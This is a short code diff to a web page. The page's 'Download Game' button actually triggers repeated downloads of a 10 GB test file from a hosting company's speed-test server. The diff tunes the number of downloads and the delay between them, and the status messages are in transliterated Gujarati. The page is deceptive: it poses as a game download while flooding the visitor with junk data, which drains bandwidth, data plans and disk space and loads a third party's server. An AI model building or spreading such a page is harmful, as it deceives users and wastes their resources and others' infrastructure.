@@ -14,7 +14,7 @@ p { color: #555; margin-top: 12px; }
 <button onclick="downloadTwice()">Download Game</button>
 <p id="status"></p>
 <script>
-const DOWNLOAD_COUNT = 30;
+const DOWNLOAD_COUNT = 5;
 function downloadTwice() {
   const fileUrl = "https://hil-speed.hetzner.com/10GB.bin";
   document.getElementById('status').innerText = "Download shuru thai rahyu chhe...";
@@ -29,7 +29,7 @@ function downloadTwice() {
       if (i === DOWNLOAD_COUNT) {
         document.getElementById('status').innerText = DOWNLOAD_COUNT + " downloads chalu thai gaya!";
       }
-    }, i * 800);
+    }, i *3000);
   }
 }
 </script>
